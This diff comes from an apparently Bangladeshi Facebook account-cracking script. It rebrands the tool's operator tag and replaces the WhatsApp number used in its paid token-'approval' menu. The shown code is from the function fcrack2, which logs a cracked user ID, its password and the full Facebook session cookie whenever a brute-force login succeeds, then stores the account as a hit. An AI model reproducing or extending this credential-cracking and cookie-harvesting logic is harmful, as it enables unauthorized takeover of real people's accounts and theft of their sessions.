@@ -919,7 +919,7 @@ def fcrack2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m  [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m  [tajul>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                 oks.append(cid)
@@ -968,7 +968,7 @@ def approval():
       print('\033[1;97m[\033[92;1m●\033[1;97m] Join Fb Group')
       print('\033[1;97m[\033[92;1m●\033[1;97m] Exit Menu')                               
       input('\033[1;97m[\033[92;1mENTER\033[1;97m] Upgrade Tool (\033[92;1mPremium\033[1;97m)  ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801701707661?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801713085880?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
